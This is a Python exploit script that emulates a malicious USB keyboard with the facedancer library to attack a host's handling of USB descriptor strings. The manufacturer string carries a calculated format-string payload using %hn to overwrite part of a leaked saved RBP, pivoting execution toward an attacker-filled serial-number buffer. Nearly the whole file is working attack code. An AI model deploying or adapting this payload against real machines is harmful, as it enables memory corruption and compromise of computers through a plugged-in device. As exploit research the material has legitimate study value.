#!/usr/bin/env python3
# pylint: disable=unused-wildcard-import, wildcard-import, logging-fstring-interpolation
# === RBP overwrite exploit ===
# NOTE: use the same vuln to leak the target RBP value at index 46
import sys
import os
import logging
from facedancer import main
from facedancer.devices.keyboard import USBKeyboardDevice

# Log formatting strings.
LOG_FORMAT_COLOR = "\u001b[37;1m%(levelname)-8s| \u001b[0m\u001b[1m%(module)-15s|\u001b[0m %(message)s"
LOG_FORMAT_PLAIN = "%(levelname)-8s:n%(module)-15s>%(message)s"
LOG_FORMAT = LOG_FORMAT_COLOR
LOG_LEVEL = 50 - (int(3) * 10)
logging.basicConfig(level=LOG_LEVEL, format=LOG_FORMAT)

# EXPLOIT CONSTANTS
# the RBP value we're going to overwrite (leak this with the same vuln)
LEAKED_RBP = int(os.environ.get("RBP", None), base=16)
# these are the values we're going to try to get to with the exploit
SERIAL = "AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAAB"
# product string value, not important but length may affect offsets
PRODUCT = "AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAABBAABCAAB"
PADDER = "_"        # padding char
OFFSET = 5954       # offset from target RBP to get to SERIAL buffer
ALIGNED_LEN = 123   # length to align payload to
RBP_INDEX = 46      # param index where target RBP is found

def xprint(msg):
    logging.info(f"[+] {msg}")

def calculate_payload(leaked_rbp):
    # the address where the Z's buffer will be located
    z_addr = leaked_rbp - OFFSET # the offset was calc'd while attached w/ gdb

    # the least significant bit of the Z's addr
    # this is going to be the value we try to write at the LSB of the leaked RBP
    z_addr_lsb = (z_addr | 0xffffffff0000) ^ 0xffffffff0000

    # number of bytes that will have already been written due to prepended string
    already_written = len("event8  - ")

    # the width that will be used in the format string as padding to increment the
    # number of bytes written trying to write
    target_width = z_addr_lsb - already_written

    # the format string for the payload with calculated values
    payload = f"%1$0{target_width}x %{RBP_INDEX}$hn"

    # calculate how much padding will be needed
    padding = PADDER * (ALIGNED_LEN - len(payload))

    # print final payload
    final = f"{payload}{padding}"

    # debug messages
    xprint(f"using leaked $rbp {hex(leaked_rbp)} for calculations")
    xprint(f"SERIAL buffer should be at <$leaked_rbp-{OFFSET}>: {hex(z_addr)}")
    xprint(f"will overwrite target RBP's LSB with: {hex(z_addr_lsb)}")

    msg = "width to write target val via %hn: "
    msg += f"serial_buf:{hex(z_addr_lsb)} - prefix_len:10 = {target_width}"
    xprint(f"{msg}")
    xprint(f"aligning payload to {padding} bytes")
    xprint(f"PAYLOAD = {final}")
    return final

# ========================================
# EXPLOIT
# the RBP value we're going to overwrite (leak this with the same vuln)
if LEAKED_RBP is None:
    logging.error("set env var 'RBP' to the value of the leaked RBP")
    logging.error("make sure to run with `sudo -E`!!!")
    sys.exit(1)

# manufacturer string will contain the payload
manu = calculate_payload(LEAKED_RBP)

# these are the Zs we're going to try to get to with the exploit
serial = os.environ.get("FSERIAL", SERIAL)

# a default value, not directly important
product = os.environ.get("FPRODUCT", PRODUCT)

# custom logging to display what we'll be using for the run
if len(serial) > 50:
    logging.info(f"serial = {serial[:50]}...({len(serial)-50} more)")
else:
    logging.info(f"serial = {serial}")

if len(product) > 50:
    logging.info(f"product = {product[:50]}...({len(product)-50} more)")
else:
    logging.info(f"product = {product}")

if len(manu) > 50:
    logging.info(f"manu = {manu[:50]}...({len(manu)-50} more)")
else:
    logging.info(f"manu = {manu}")

# create the device and connect
DEVICE = USBKeyboardDevice()
DEVICE.serial_number_string = serial
DEVICE.manufacturer_string = manu
DEVICE.product_string = product
DEVICE.product_id = 0x1337
DEVICE.vendor_id = 0x1337
main(DEVICE)
